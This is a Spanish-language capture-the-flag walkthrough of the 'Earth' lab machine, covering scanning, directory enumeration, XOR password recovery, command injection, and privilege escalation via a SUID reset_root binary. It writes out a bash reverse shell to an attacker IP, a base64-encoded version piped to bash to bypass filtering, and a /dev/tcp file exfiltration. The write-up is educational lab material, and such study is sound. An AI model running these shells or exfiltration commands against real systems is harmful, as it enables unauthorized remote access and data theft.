- Comenzamos obteniendo la ip de nuestra maquina para buscar las IP dentro de la red y encontrar la maquina victima.
```
ifconfig 
```

- Con " netdiscover " buscaremos los dispositivos conectados al segmento de red de nuestro equipo
	```
	sudo netdiscover -r 192.168.1.0/24
	```

- Con " nmap " buscaremos los puertos y las versiones de los servicios que consumen estos puertos para el análisis de vulnerabilidades.
	```
	sudo nmap -sV -A -T5 192.168.1.28
	```
	- Encontramos los puertos abiertos:
		- 22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
		- 80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
		- 443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)

- Revisando la pagina web el código fuente, NO encontramos nada que nos pueda ayudar
- ![[web.png]]

- Por lo que realizaremos una enumeración de directorios utilizando " dirb ":
	```
	sudo dirb http://192.168.1.28/
	```
	- El cual nos deja un directorio al descubierto " http://192.168.1.28/cgi-bin/ ", el cual si entramos nos muestra que no tenemos permisos.
		- ![[forbidden.png]]

- En nmap encontramos un certificado ssl por el puerto 443 por lo que procedemos configurar la resolución del DNS.
- Entramos a " /etc/hosts/ " con " nano " y configuramos para la IP de la maquina
	```
	sudo nano /etc/hosts/
	```
	
	```
	192.168.1.28 earth.local
	192.168.1.28 terratest.earth.loca
	```

	- Verificamos la web " erath.local " y nos muestra la paguina
		- ![[earth.png]]


- Utilizando " dirb http://earth.local/ " obtenemos los siguiente:
	- http://earth.local/admin
	- http://earth.local/cgi-bin/
- Utilizando " dirb https://terratest.earth.local/ ":
	- https://terratest.earth.local/cgi-bin/
	- https://terratest.earth.local/index.html
	- https://terratest.earth.local/robots.txt

- Revisando el " robot.txt " encontramos lo siguiente:
	- ![[robot.png]]
	- Donde revisando la parte de abajo del " robot.txt " vemos que existe " /testingnotes.* "
	- ![[testingnotes.png]]
	- La nota nos comenta que usan " XOR " como algoritmo de encriptación.
	- Nos dan una txt " testdata.txt " que se usan para las pruebas.
	- Y nos dan el nombre del aministrador del portal  " terra "

- Entramos a revisar " testdata.txt " para ver lo que contiene:
	- ![[testdata.png]]

- Nos decian que " testdata.txt " se usaba para las pruebas:
	- According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
- Con " cyberChef " vamos a ir probando cada mensaje de encriptación que nos muestra la paguina, utilizando la key que contiene " testdata.txt ".
	- ![[test.png]]
	- ![[cyberchef.png]]
- Nos damos cuenta que la palabra se repite " earthclimatechangebad4humans "

- Ya podemos hacer prueba de logueo " http://earth.local/admin/login "
	- Tenemos usuario y contraseña:
		- terra
		- earthclimatechangebad4humans
	- Nos manda la siguiente pantalla:
		- ![[commandtool.png]]

- En esta pantalla vemos que podemos insertar comandos por lo que podemos hacer una shellrevers para crear una conexión remota.
- Utilizando " shells " https://github.com/4ndr34z/shells podremos automatizar la creación de shells para la conexión remota.
- INSTALACIÓN:
	- git clone https://github.com/4ndr34z/shells
	- cd shells
	- ./install.sh
- EJECUCIÓN:
	- PASO 1: elegimos " 3) BASH " para crear un script en bash
		- ![[paso1.png]]
	- PASO 2: Aquí pondremos la IP de la maquina atacante y el puerto por donde se comunicara con la maquina victima, y elegimos la opción " 1) NORMAL ".
		- ![[paso2.png]]
	- PASO 3: elegimos la opción " 1) No encoding TCP "
		- ![[paso3.png]]
	- PASO 4: elegimos la opción " 1) rlwrap nc tcp " y le colocamos " n " para que la sesión este en la misma terminal.
		- ![[paso4.png]]
	- PASO 5: ahora estamos listos en mandar el script de conexión remota al CLI de la victima.
		- sh -i >& /dev/tcp/192.168.1.113/443 0>&1
		- ![[paso5.png]]
		- Vemos que no nos permite la conexión remota:
			- ![[NOconecction.png]]
		- Por lo que vamos a tener que cifrar y decifrar el script.
		- echo 'sh -i >& /dev/tcp/192.168.1.113/443 0>&1' | base64
			- c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExMy80NDMgMD4mMQo=
		- Quedaria de la siguiente manera:
			- echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExMy80NDMgMD4mMQo=' | base64 -d | bash
		- ![[cli_conexión.png]]
		- Revisamos la conexión y vemos que ya entramos:
			- ![[sistem.png]]
- Hora posemos buscar las flags del reto:
	- FLAG-USER:
		- ![[flagUSER.png]]
	- FLAG-ROOT:
		- Usando una busqueda de permisos de archivos root: 
		- find / -perm -u=s -type f 2>/dev/null
		- ![[fileroot.png]]
		- Revisamos todos los archivos el " reset_root " parece algo extraño por lo que procedemos a verificarlo y ejecutarlo.
		- Para ello lo enviaremos a nuestra maquina atacante por medio de " netcat "
		- Abrimos una  nueva terminal y ejecutamos:
		- " nc -lvnp 3333 > reset_root  "
		- ![[netcat_root.png]]
		- Y en la maquina victima ponemos:
		- " cat /usr/bin/reset_root > /dev/tcp/192.168.1.113/3333 "
		- Se descarga el archivo en la ruta actual:
		- ![[netcat_root.png]]
	- LE DAMOS PERMISOS AL " reset_root ":
		- ``` chmod +x reset_root ```
	- EJECUTAMOS:
		- ``` ltrace ./reset_root ```
		- ![[ltrace.png]]
	
- NOS REGRESAMOS A LA MAQUINA VICTIMA PARA CREAR ESOS ARCHIVOS QUE NOS FALTAN

```
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

- UNA VES CREADO LOS ARCHIVOS EN LA MAQUINA VICTIMA, PROCEDEMOS A EJECUTAR OTRA VES " reset_root " PARA RESTABLECER LAS CREDENCIALES DEL USER-ROOT.

```
reset_root
```

- Y LA CONTRASEÑA ROOT SE RESTABLECE A  " Earth "
	- ![[pass-root.png]]

- INICIAMOS SESIÓN COMO ROOT:
	- ![[root.png]]

- BUSCAMOS LA FLAG DEL ROOT QUE NOS FALTA:

```
cat /root/root_flag.txt
```

- ![[flag-root.png]]



